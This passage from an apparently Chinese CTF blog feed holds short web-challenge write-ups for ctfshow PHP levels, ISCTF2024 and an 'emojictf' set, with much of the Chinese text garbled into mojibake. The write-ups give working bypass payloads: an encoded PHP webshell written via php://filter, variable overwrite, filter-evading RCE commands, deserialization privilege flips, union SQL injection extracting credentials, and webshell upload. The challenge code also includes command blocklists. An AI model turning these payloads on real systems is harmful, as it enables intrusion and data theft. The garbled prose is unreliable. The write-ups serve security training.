filename;</p><p>æ—¢ç„¶å¾€è¿›å†™æ–‡ä»¶é‚£å°±å¯ä»¥å†™ä¸€ä¸ªphpçš„ä¸€å¥è¯æœ¨é©¬æˆ–è€…æ˜¯å‘½ä»¤æ‰§è¡Œé‚£ä¸€å¥è¯æœ¨é©¬å¦‚ä½•åªä½œä¸ºæ•°å­—å¹¶ä¸”ç»è¿‡å‡½æ•°åˆæ­£å¸¸æ‰§è¡Œå‘¢é‚£ä¸€å®šæ˜¯16è¿›åˆ¶å’Œhex2binä½†æ˜¯0xåœ¨is_numericé‡Œé¢è¿‡ä¸å»ï¼›æ‰€ä»¥å¯ä»¥è¿›è¡Œï¼šå…ˆbase64å†16è¿›åˆ¶ï¼š</p><?=`tac *`;(base64ä¹‹åå†è½¬16è¿›åˆ¶)<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=cc504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php` `post: v1=hex2bin</span><br></pre></td></tr></table></figure>103ï¼šå°±è¿‡æ»¤äº†php,å’Œ102ä¸€æ ·104ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(sha1($v1)==sha1($v2))&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure>ç›´æ¥æ•°ç»„ç»•è¿‡105ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__); include(&#x27;flag.php&#x27;); error_reporting(0); $error=&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;; $suces=&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;; foreach($_GET as $key =&gt; $value)&#123;   if($key===&#x27;error&#x27;)&#123;     die(&quot;what are you doing?!&quot;);   &#125;   $$key=$$value; &#125;foreach($_POST as $key =&gt; $value)&#123;   if($value===&#x27;flag&#x27;)&#123;     die(&quot;what are you doing?!&quot;);   &#125;   $$key=$$value; &#125; if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;   die($error); &#125; echo &quot;your are good&quot;.$flag.&quot;\n&quot;; die($suces); ?&gt; </span><br></pre></td></tr></table></figure>å˜é‡è¦†ç›–ï¼š[PHPå˜é‡è¦†ç›–æ¼æ´è§£æ-CSDNåšå®¢](https://blog.csdn.net/weixin_43803070/article/details/91151861)foreach ($_GET as $key => $value)$$key = $$valueè¿™ä¸ªçš„æ„æ€å¦‚æœä½ è¿›è¡ŒGETä¼ å‚çš„è¯ï¼š1=flag;é‚£ä¹ˆå°±æ˜¯$1=$flag;ç„¶åå†æ ¹æ®æ¡ä»¶:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;   die($error); </span><br></pre></td></tr></table></figure>è¿™ä¸ªå°±æ˜¯æ£€æŸ¥POSTä¼ å‚é‡Œé¢çš„é”®é‡Œé¢æ˜¯ä¸æ˜¯æœ‰flagçš„å‚æ•°ï¼›ç„¶åå®ƒæ¯”è¾ƒ $_POST['flag'] çš„å€¼ä¸ä¹‹å‰åŠ è½½çš„ flag.php æ–‡ä»¶ä¸­å®šä¹‰çš„ $flag å˜é‡çš„å€¼æ˜¯å¦ç›¸ç­‰ã€‚å¦‚æœè¿™ä¸¤ä¸ªå€¼ä¸ç›¸ç­‰ï¼ˆå³ !($_POST['flag']==$flag) ä¸ºçœŸï¼‰ï¼Œåˆ™æ‰§è¡Œdie($error); è¯­å¥ï¼Œç»ˆæ­¢è„šæœ¬æ‰§è¡Œï¼Œå¹¶è¾“å‡º $error å˜é‡çš„å€¼ä½œä¸ºé”™è¯¯ä¿¡æ¯ï¼›è¿™é‡Œåˆ©ç”¨çš„æ˜¯die($error)æ¥å®ç°çš„è¾“å‡ºpyload:GET:?1=flag  POST:error=1;å³ï¼š$error=$1=$flag;106ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;     echo $flag;   &#125; </span><br></pre></td></tr></table></figure>æ•°ç»„ç»•è¿‡ï¼›107:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;v1&#x27;]))&#123;   $v1 = $_POST[&#x27;v1&#x27;];   $v3 = $_GET[&#x27;v3&#x27;];    parse_str($v1,$v2);    if($v2[&#x27;flag&#x27;]==md5($v3))&#123;      echo $flag;    &#125; </span><br></pre></td></tr></table></figure>`parse_str` å‡½æ•°æœ‰ä¸¤ç§ä½¿ç”¨æ–¹å¼ï¼š1. å½“åªä¼ å…¥ä¸€ä¸ªå‚æ•°æ—¶ï¼Œå®ƒä¼šæŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£ææˆå˜é‡ï¼Œå¹¶å°†è¿™äº›å˜é‡æ³¨å†Œåˆ°å½“å‰ç¬¦å·è¡¨ä¸­ã€‚//å¯ä»¥ç†è§£æ˜¯ä¼ å€¼2. å½“ä¼ å…¥ä¸¤ä¸ªå‚æ•°æ—¶ï¼Œå®ƒä¼šæŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£ææˆå˜é‡ï¼Œç„¶åå°†è¿™äº›å˜é‡ä½œä¸ºé”®å€¼å¯¹å­˜å‚¨åœ¨ç¬¬äºŒä¸ªå‚æ•°æ‰€æŒ‡å®šçš„æ•°ç»„é‡Œã€‚å…ˆæ•°ç»„ç»•è¿‡?v3[]=1;ç„¶å<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($v2[&#x27;flag&#x27;]==md5($v3))&#123;      echo $flag;    &#125; </span><br></pre></td></tr></table></figure>v1=flag108:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123;   die(&#x27;error&#x27;); &#125; //åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;   echo $flag; &#125; </span><br></pre></td></tr></table></figure>ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­— æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´äº†æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡,æ‰€ä»¥å¯ä»¥ä½¿ç”¨%00æˆªæ–­æ­£åˆ™åŒ¹é…;?c=a%00778109:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_GET[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;       eval(&quot;echo new $v1($v2());&quot;);   &#125; </span><br></pre></td></tr></table></figure>å¯ä»¥è¿›è¡Œå’Œåå°„ç±»ä¸€æ ·æˆ–è€…å°è¯•ä¸€ä¸‹å¼‚å¸¸ç±»110ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;   $v1 = $_GET[&#x27;v1&#x27;];   $v2 = $_GET[&#x27;v2&#x27;];   if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;       die(&quot;error v1&quot;);   &#125;   if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;       die(&quot;error v2&quot;);   &#125;   eval(&quot;echo new $v1($v2());&quot;); </span><br></pre></td></tr></table></figure>è€ƒç‚¹ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filesystemiterator éå†æ–‡ä»¶ç±»(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</span><br><span class="line"></span><br><span class="line">DirectoryIterator éå†ç›®å½•ç±»</span><br><span class="line"></span><br><span class="line">getcwd()å‡½æ•° è·å–å½“å‰å·¥ä½œç›®å½• è¿”å›å½“å‰å·¥ä½œç›®å½•</span><br></pre></td></tr></table></figure>ç„¶åéå†ç›®å½•å°±è¡Œï¼ŒæŸ¥çœ‹åˆ°få¼€å¤´çš„æ–‡ä»¶ï¼Œç›´æ¥è®¿é—®å°±è¡Œäº†111ï¼š112ï¼š<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>is_fileå‡½æ•°æ˜¯æ£€æŸ¥æ˜¯ä¸æ˜¯å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœæœ‰echo hacker,å¦åˆ™å°±é«˜äº®æ˜¾ç¤ºï¼›ç›´æ¥è¿›è¡Œä¼ªåè®®è¯»å–flag113:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($file)&#123;   if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;     die(&#x27;hacker!&#x27;);   &#125;else&#123;     return $file;   &#125; &#125; $file=$_GET[&#x27;file&#x27;]; if(! is_file($file))&#123;   highlight_file(filter($file)); &#125;else&#123;   echo &quot;hacker!&quot;; &#125;</span><br></pre></td></tr></table></figure>ä¸€çœ‹çš„è¯å¯èƒ½æ˜¯ä¼ªåè®®ï¼›æ²¡æœ‰è¿‡æ»¤å°è£…åè®®ï¼›å¯ä»¥è¿›è¡Œï¼š?file=compress.zlib://flag.php114ï¼š`function filter($file){   if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){     die('hacker!');   }else{     return $file;   } } $file=$_GET['file']; echo "å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼"; if(! is_file($file)){   highlight_file(filter($file)); }else{   echo "hacker!"; } `å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼æ²¡æœ‰è¿‡æ»¤filter;?file=php://filter/resource=flag.php;115:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function filter($num)&#123;   $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);   $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);   return $num; &#125; $num=$_GET[&#x27;num&#x27;]; if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;   if($num==&#x27;36&#x27;)&#123;     echo $flag;   &#125;else&#123;     echo &quot;hacker!!&quot;;   &#125; &#125;else&#123;   echo &quot;hacker!!!&quot;;</span><br></pre></td></tr></table></figure>1:è¿›è¡Œæ›¿æ¢ 2ï¼šæ˜¯ä¸æ˜¯æ•´æ•° 3ï¼šä¸=36 4ï¼štrimå‡½æ•°å»é™¤ä¿©è¾¹ç©ºç™½ç¬¦ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤\f   5:filter(num)=36<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">for ($i = 0; $i &lt; 129; $i++) &#123;</span><br><span class="line">    $num = chr($i) . &#x27;36&#x27;;</span><br><span class="line">    if (trim($num) !== &#x27;36&#x27; &amp;&amp; is_numeric($num) &amp;&amp; $num !== &#x27;36&#x27;) &#123;</span><br><span class="line">        echo urlencode(chr($i)) . &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>è¿›è¡Œæµ‹è¯•ï¼›?num=%0c36]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>isctf2024web</title>
      <link href="/2025/03/16/isctf2024web/"/>
      <url>/2025/03/16/isctf2024web/</url>
      
        <content type="html"><![CDATA[<h4 id="ISCTF2024ï¼š"><a href="#ISCTF2024ï¼š" class="headerlink" title="ISCTF2024ï¼š"></a>ISCTF2024ï¼š</h4><h4 id="1z-php"><a href="#1z-php" class="headerlink" title="1z_php:"></a>1z_php:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;J&#x27;]))&#123;  $call=$_POST[&#x27;J&#x27;];  $dangerous_commands = [&#x27;cat&#x27;, &#x27;tac&#x27;, &#x27;head&#x27;, &#x27;nl&#x27;, &#x27;more&#x27;, &#x27;less&#x27;, &#x27;tail&#x27;, &#x27;vi&#x27;, &#x27;sed&#x27;, &#x27;od&#x27;];  foreach ($dangerous_commands as $command) &#123;    if (preg_match(&quot;/$command/i&quot;, $call)) &#123;      die(&quot;è¿™äº›ä¸ªå±é™©å‡½æ•°å¯ä¸å…´ä½¿å•Š&quot;);    &#125;  &#125;  system($call);&#125;?&gt;</span><br></pre></td></tr></table></figure><p>J&#x3D;ls &#x2F;   J&#x3D;uniq &#x2F;f14g</p><h4 id="25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š"><a href="#25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š" class="headerlink" title="25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š:"></a>25æ—¶æ™“å±±ç‘å¸Œç”Ÿæ—¥ä¼š:</h4><p>ä½ ä¸æ˜¯çƒ¤pï¼è¦æ˜¯Project Sekaiçš„å®¢æˆ·ç«¯è¯·æ±‚æ‰èƒ½åŠ å…¥ç”Ÿæ—¥ä¼š</p><p>åœ¨UAå¤´ä¸Šé¢æ”¹å¾—åˆ°ï¼šä½ ä¼¼ä¹æ²¡åœ¨æ­£ç¡®çš„æ—¶é—´æ¥â€¦ï¼Œé¢ï¼Œæ—¶é—´:ä¼ªé€ data:Date: Thu, 27 Aug 2024 05:00:00 GMT</p><h4 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce:"></a>ezrce:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;cmd&#x27;])) &#123;   $cmd = $_GET[&#x27;cmd&#x27;];   if (preg_match(&quot;/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&amp;\&gt;\&lt;]|eval|system|exec|popen|shell_exec/i&quot;, $cmd)) &#123;     die(&quot;Blocked by security filter!&quot;);   &#125; else &#123;     eval($cmd);   &#125; &#125; else &#123;   highlight_file(__FILE__); </span><br></pre></td></tr></table></figure><p>cmd&#x3D;var_dump(scandir(â€˜&#x2F;â€˜));è¿›è¡Œè¯»å–æ ¹ç›®å½•ä¸‹é¢çš„æ–‡ä»¶å‘ç°flagï¼Œ</p><p>æ³•1ï¼šcmd&#x3D;include$_GET[1];&amp;1&#x3D;pHp:&#x2F;&#x2F;FilTer&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag ç„¶åè§£ç </p><p>æ³•2ï¼š?cmd&#x3D;var_dump(file_get_contents($_GET[â€˜1â€™]));&amp;1&#x3D;&#x2F;flag</p><p>æ³•3:å–åç»•è¿‡</p><p>æ³•4:cmd&#x3D;passthru(â€˜cd%09..;cd%09..;uniq%09&#x2F;?l*â€™);</p><h4 id="ezserialize"><a href="#ezserialize" class="headerlink" title="ezserialize:"></a>ezserialize:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php error_reporting(0); class Flag &#123;   private $flag;   public function __construct() &#123;     $this-&gt;flag = file_get_contents(&#x27;/flag&#x27;);   &#125;   public function getFlag() &#123;     return $this-&gt;flag;   &#125;   public function __toString() &#123;     return &quot;You can&#x27;t directly access the flag!&quot;;   &#125; &#125; class User &#123;   public $username;   public $isAdmin = false;   public function __construct($username) &#123;     $this-&gt;username = $username;   &#125;   public function __wakeup() &#123;     if ($this-&gt;isAdmin) &#123;       echo &quot;Welcome, admin! Here&#x27;s your flag: &quot; . (new Flag())-&gt;getFlag();     &#125; else &#123;       echo &quot;Hello, &quot; . htmlspecialchars($this-&gt;username) . &quot;!&quot;;     &#125;   &#125; &#125; if (isset($_GET[&#x27;data&#x27;])) &#123;   $data = $_GET[&#x27;data&#x27;];   $object = unserialize($data);   if ($object instanceof User) &#123;     echo $object;   &#125; else &#123;     echo &quot;Invalid object!&quot;;   &#125; &#125; else &#123;   highlight_file(__FILE__); &#125; ?&gt; </span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°†falseæ”¹ä¸ºtrueç„¶åéšä¾¿ä¼ usernameå°±è¡Œäº†ï¼›</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag &#123;</span><br><span class="line">    private $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User &#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $isAdmin = true;</span><br><span class="line">&#125;</span><br><span class="line">$user = new User();</span><br><span class="line">$user-&gt;username =&quot;1&quot;;</span><br><span class="line">echo serialize($user);</span><br></pre></td></tr></table></figure><h4 id="å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤ï¼š"><a href="#å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤ï¼š" class="headerlink" title="å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤ï¼š"></a>å°è“é²¨çš„ä¸´æ—¶å­˜å‚¨å®¤ï¼š</h4><p>è¿™ä¸ªç›´æ¥ä¼ ä¸Šå»å‘ç°&#x2F;flagæ–‡ä»¶æ‰“ä¸å¼€æƒé™ä¸å¤Ÿ</p><p>å‘ç°&#x2F;down_file.sh:find &#x2F;var&#x2F;www&#x2F;localhost&#x2F;htdocs&#x2F;uploads&#x2F; -type f -name â€œ*.phpâ€ -exec rm -f {} ;</p><p>å¯ä»¥æ”¹ä¸ºï¼š&#x2F;flag &gt; &#x2F;tmp&#x2F;1.txt ç„¶åç­‰ä¼šå°±okäº†</p><h4 id="å°è“é²¨çš„å†’é™©ï¼š"><a href="#å°è“é²¨çš„å†’é™©ï¼š" class="headerlink" title="å°è“é²¨çš„å†’é™©ï¼š"></a>å°è“é²¨çš„å†’é™©ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a = &quot;isctf2024&quot;; $b = $_GET[&quot;b&quot;]; @parse_str($b); if ($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;)) &#123;   $num = $_POST[&quot;num&quot;];   if($num == 2024)&#123;     die(&quot;QAQ&quot;);   &#125;   if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;     die(&quot;no no no!&quot;);   &#125;   if(intval($num,0) == 2024)&#123;     if (isset($_GET[&#x27;which&#x27;]))&#123;       $which = $_GET[&#x27;which&#x27;];       switch ($which)&#123;         case 0:           print(&#x27;QAQ&#x27;);         case 1:         case 2:           require_once $which.&#x27;.php&#x27;;           echo $flag;           break;         default:           echo GWF_HTML::error(&#x27;PHP-0817&#x27;, &#x27;Hacker NoNoNo!&#x27;, false);           break; </span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯md5ç»•è¿‡ï¼šb&#x3D;a[0]&#x3D;240610708</p><p>ç„¶å:å°æ•°ç»•è¿‡ï¼šnum&#x3D;2024.1æˆ–è€…8è¿›åˆ¶</p><p>ç„¶åï¼š</p><p>if (isset($_GET[â€˜whichâ€™])){       $which &#x3D; $_GET[â€˜whichâ€™];       switch ($which){         case 0:           print(â€˜QAQâ€™);         case 1:         case 2:           require_once $which.â€™.phpâ€™;           echo $flag;           break;         default:           echo GWF_HTML::error(â€˜PHP-0817â€™, â€˜Hacker NoNoNo!â€™, false);           break;</p><p>ä¼ which&#x3D;flag æ­£å¥½åŒ¹é…flag.phpå°±å‡ºæ¥äº†</p><h4 id="å°è“é²¨çš„ç§˜å¯†ï¼š"><a href="#å°è“é²¨çš„ç§˜å¯†ï¼š" class="headerlink" title="å°è“é²¨çš„ç§˜å¯†ï¼š"></a>å°è“é²¨çš„ç§˜å¯†ï¼š</h4><p>æ‰“å¼€å‘ç°302è·³è½¬ï¼›ç›´æ¥æŠ“åŒ…å‡ºæ¥flag</p><h4 id="UP-UPloader"><a href="#UP-UPloader" class="headerlink" title="UP!UPloader:"></a>UP!UPloader:</h4><p>æ–‡ä»¶ä¸Šä¼ ï¼Œä¼ ä¸Šå»å°é©¬ï¼›ç„¶åå‘ç°include.phpä¼šå‡ºæ¥æ–‡ä»¶æºç ï¼Œå…ˆè¯»upload.php</p><p>æ–‡ä»¶ä¸Šä¼ åˆ° .&#x2F;uploads&#x2F; ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åè¢«é‡å‘½åæˆ [md5 åŠ å¯†](<a href="https://so.csdn.net/so/search?q=md5">https://so.csdn.net/so/search?q=md5</a> åŠ å¯†&amp;spm&#x3D;1001.2101.3001.7020)+åç¼€ï¼ŒæŒ‰ç…§é€»è¾‘è®¿é—®</p><p>ç„¶åèšå‰‘è¿æ¥å°±è¡Œäº†</p><p>å‘ç°æ‰¾ä¸åˆ°è¿™é‡Œå¯ä»¥åœ¨ç½‘ç«™ä¸Šé¢æ‰§è¡Œ:</p><p>cmd&#x3D;system(â€˜envâ€™);</p><p>cmd&#x3D;phpinfo();éƒ½å¯ä»¥æ‰¾åˆ°</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>emojictfweb</title>
      <link href="/2025/03/16/emojictfweb/"/>
      <url>/2025/03/16/emojictfweb/</url>
      
        <content type="html"><![CDATA[<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE:"></a>RCE:</h3><p>å‘ç°f12ä¸èƒ½ä½¿ç”¨ï¼Œæ²¡äº‹ï¼Œå¼ å¸ˆå‚…ç»™æˆ‘è¯´ctrl+shift+iå°±å¯ä»¥äº†ï¼Œok.è¯•äº†è¯•å‘ç°æ²¡æœ‰æœ‰ç”¨çš„ä¸œè¥¿ï¼Œdirsearchæ‰«æä¸€ä¸‹å‘ç°robots.txt</p><p>ç„¶åå‘ç° &#x2F;<a href="mailto:&#102;&#x6c;&#64;&#103;&#46;&#112;&#104;&#x70;">fl@g.php</a>,æŸ¥çœ‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;emo&#x27;]))&#123;   $emo = $_GET[&#x27;emo&#x27;];  if(!preg_match(&quot;/\;|\&quot;|\*| |[b-h]|[m-r]|\\$|\&#123;|\&#125;|\^|\&gt;/i&quot;,$emo))&#123;    system($emo);  &#125;  else&#123;    echo &quot;Again&quot;;    &#125;&#125;else&#123;  echo &quot;Try&quot;;&#125;</span><br></pre></td></tr></table></figure><p>å…ˆè¿›è¡ŒlsæŸ¥çœ‹ï¼Œå‘ç°flag.txtï¼Œç„¶åemo&#x3D;tail%09??a?.txtè¿›è¡ŒæŸ¥çœ‹</p><h3 id="http"><a href="#http" class="headerlink" title="http:"></a>http:</h3><p>ä½ çš„User-Agentå¿…é¡»è¢«æœåŠ¡å™¨è¯†åˆ«ä¸ºEMOJI_CTF_User_Agent_v1.0  åªæœ‰ä½¿ç”¨æ­£ç¡®çš„HTTPæ–¹æ³•æ‰èƒ½è·å–flagï¼Œä¸åŒçš„æ–¹æ³•ä¼šå¾—åˆ°ä¸åŒçš„æç¤ºã€‚ éœ€è¦æä¾›æ­£ç¡®çš„è‡ªå®šä¹‰å¤´éƒ¨EMOJI-CTF-Authä¸”å…¶å€¼ä¸ºâ€™Passw0rd!â€™ã€‚ å…¨éƒ¨å®Œæˆä½ å°±èƒ½è·å¾—flag!!!</p><p>åœ¨bpä¸Šé¢æ”¹ç„¶ååœ¨httpæ–¹æ³•ä¸Šé¢è¿›è¡Œçˆ†ç ´æµ‹è¯•æ˜¯ä»€ä¹ˆæ–¹æ³•ï¼Œå‘ç°æ˜¯PUTæ–¹æ³•ï¼Œç„¶åè®¿é—®fl1l1l1l1ag.php</p><h3 id="e4-sql"><a href="#e4-sql" class="headerlink" title="e4_sql:"></a>e4_sql:</h3><p>è¿›è¡Œè®¿é—®å‘ç°1â€æ—¶å€™æŠ¥é”™è¯´æ˜æ˜¯å­—ç¬¦å½¢æ³¨å…¥</p><p>1â€ order by 2#çš„æ—¶å€™å’Œ 3å’Œ4çš„æ—¶å€™ä¸ä¸€æ ·è¯´æ˜æœ‰ä¿©åˆ—</p><p>-1â€ union select 1,2#å‘ç°2æ˜¯å›æ˜¾ä½ç½®</p><p>ç„¶åä»–æ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥æ³¨å°±è¡Œäº†</p><p>-1â€ union select 1,database()#<br>-1â€ union select 1,(select group_concat(username,password) from information)#</p><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web:"></a>easy_web:</h3><p>æ¬¢è¿æ‰“å¼€è¿™ä¸ªé¢˜ç›®!</p><p>ä½†æ˜¯ä½ çš„è®¿é—®è¢«æ‹’ç»äº†ï¼Œå› ä¸ºæˆ‘ä»¬é‡‡ç”¨äº†å’ŒçŸ¥ä¹ä¸€æ ·çš„åçˆ¬è™«ç­–ç•¥ï¼Œè€Œä½ çš„è®¿é—®è¢«è®¤ä¸ºæ˜¯è¿è§„çš„çˆ¬è™«äº†ã€‚</p><p>æ ¹æ®æç¤ºï¼š User-Agent:Baiduspider</p><p>ç„¶åï¼šæ¬¢è¿æ¥è‡ªåƒåœ¾ç™¾åº¦çš„è‡­è™«å­ï¼ä½†æ˜¯ä½ çˆ¬ä¸åˆ°ä»€ä¹ˆäº†ï¼Œå› ä¸ºæœ¬ç½‘ç«™ç°åœ¨ä»…å…è®¸æ¥è‡ªCloudFlare CDNçš„æµé‡</p><p>é‚£ä¹ˆCloudFlareCDNæ˜¯ä»€ä¹ˆï¼Œè¦ç‰¹åœ°æå‡ºæ¥å‘¢ï¼Œä¸çŸ¥é“å°±å»æœï¼ŒCloudflare HTTP æ ‡å¤´(<a href="https://developers.cloudflare.com/fundamentals/reference/http-headers/">Cloudflare HTTP æ ‡å¤´ Â·Cloudflare åŸºç¡€çŸ¥è¯†æ–‡æ¡£</a>)</p><p>ç„¶åå°±éšä¾¿å°è¯•äº†ä¸€ä¸‹</p><p>CF-Connecting-IP:1<br>CF-IPCountry:1</p><p>å‘ç°å¥½å§ï¼Œä½ æ¥è‡ªcloudflare CDNäº†ï¼Œä½†æ˜¯ä¸ºäº†å®‰å…¨ï¼Œåé¢çš„æœºå¯†å†…å®¹åªèƒ½é€šè¿‡æ´‹è‘±è®¿é—®ï¼ˆæˆ‘æ˜¯æ€ä¹ˆçŸ¥é“ä½ æ˜¯å¦æ¥è‡ªæ´‹è‘±çš„å‘¢ï¼Ÿè¿™ä¹Ÿæ˜¯CFæ‚„æ‚„å‘Šè¯‰æˆ‘çš„å‘€ï¼‰!</p><p>ç„¶åå»æŸ¥äº†æŸ¥:</p><p>CF-Connecting-IP:1<br>CF-IPCountry:T1</p><p>OKå®Œäº‹äº†ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SHOWRCE</title>
      <link href="/2025/03/05/SHOWRCE/"/>
      <url>/2025/03/05/SHOWRCE/</url>
      
